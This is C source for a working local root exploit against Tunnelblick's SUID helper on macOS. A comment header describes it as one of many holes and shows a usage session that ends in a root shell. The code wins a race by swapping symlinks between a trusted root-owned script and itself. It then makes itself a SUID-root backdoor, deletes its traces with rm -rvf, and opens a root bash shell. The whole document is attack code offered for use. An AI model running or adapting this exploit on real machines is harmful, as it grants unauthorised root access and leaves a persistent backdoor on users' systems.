/*
 * ==== Pwnnel Blicker ====
 * =                      =
 * =        zx2c4         =
 * =                      =
 * ========================
 *
 * Tunnel Blick, a widely used OpenVPN manager for OSX
 * comes with a nice SUID executable that has more holes
 * than you care to count. It's a treasure chest of local
 * roots. I picked one that looked interesting, and here
 * we have Pwnnel Blicker.
 *
 * Tunnel Blick will run any executable that has 744
 * permissions and is owned by root:root. Probably we
 * could find a way to exploit an already existing 744
 * executable, but this would be too easy. So instead, we
 * take advantage of a race condition between checking the
 * file permissions on the executable and actually running
 * it.
 *
 * Usage:
 * $ ./a.out
 * [+] Creating vulnerable directory.
 * /Users/zx2c4/Library/Application Support/Tunnelblick/Configurations/pwnage.tblk
 * /Users/zx2c4/Library/Application Support/Tunnelblick/Configurations/pwnage.tblk/Contents
 * /Users/zx2c4/Library/Application Support/Tunnelblick/Configurations/pwnage.tblk/Contents/Resources
 * [+] Writing pid and executing vulnerable program.
 * [+] Running toggler.
 * [+] Making backdoor.
 * [+] Cleaning up.
 * /Users/zx2c4/Library/Application Support/Tunnelblick/Configurations/pwnage.tblk/Contents/Resources/../../..//pwnage.tblk/Contents/Resources/exploit.pid
 * [+] Complete. Run this again to get root.
 * Killed: 9
 *
 * $ ./a.out
 * [+] Getting root.
 * # whoami
 * root
 *
 */
 
 
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/stat.h>
 
int main(int argc, char *argv[])
{
    char dir[512];
    char script[512];
    char command[512];
    char pid_file[512];
    char path[512];
    char self[512];
    uint32_t size;
    pid_t pid, pid2;
    FILE *file;
     
    snprintf(dir, sizeof(dir), "%s/Library/Application Support/Tunnelblick/Configurations/pwnage.tblk/Contents/Resources", getenv("HOME"));
    snprintf(pid_file, sizeof(pid_file), "%s/exploit.pid", dir);
 
    /* Oh god, do I miss /proc/self/exe. */
    if (getenv("PWNPATH"))
        strcpy(self, getenv("PWNPATH"));
    else {
        size = sizeof(path);
        _NSGetExecutablePath(path, &size);
        realpath(path, self);
        setenv("PWNPATH", self, 1);
    }
 
    if (!geteuid()) {
        file = fopen(pid_file, "r");
        if (file) {
            printf("[+] Making backdoor.\n");
            chown(self, 0, 0);
            chmod(self, S_ISUID | S_IXOTH);
 
            printf("[+] Cleaning up.\n");
            fscanf(file, "%d %d", &pid, &pid2);
            fclose(file);
            snprintf(command, sizeof(command), "rm -rvf '%s/../../../'", dir);
            system(command);
         
            printf("[+] Complete. Run this again to get root.\n");
            kill(pid2, 9);
            kill(pid, 9);
            return 0;
        }
        printf("[+] Getting root.\n");
        setuid(0);
        setgid(0);
        execl("/bin/bash", "bash", NULL);
    }
 
 
    printf("[+] Creating vulnerable directory.\n");
    snprintf(command, sizeof(command), "mkdir -p -v '%s'", dir);
    system(command);
 
    pid = fork();
    if (!pid) {
        printf("[+] Running toggler.\n");
        snprintf(script, sizeof(script), "%s/connected.sh", dir);
        for (;;) {
            unlink(script);
            symlink("/Applications/Tunnelblick.app/Contents/Resources/client.down.tunnelblick.sh", script);
            unlink(script);
            symlink(self, script);
        }
    } else {
        printf("[+] Writing pid and executing vulnerable program.\n");
        file = fopen(pid_file, "w");
        fprintf(file, "%d %d", pid, getpid());
        fclose(file);
        for (;;) {
            if (fork())
                wait(NULL);
            else {
                close(0);
                close(2);
                execl("/Applications/Tunnelblick.app/Contents/Resources/openvpnstart", "openvpnstart", "connected", "pwnage.tblk", "0", NULL);
            }
        }
    }
 
    return 0;  
}
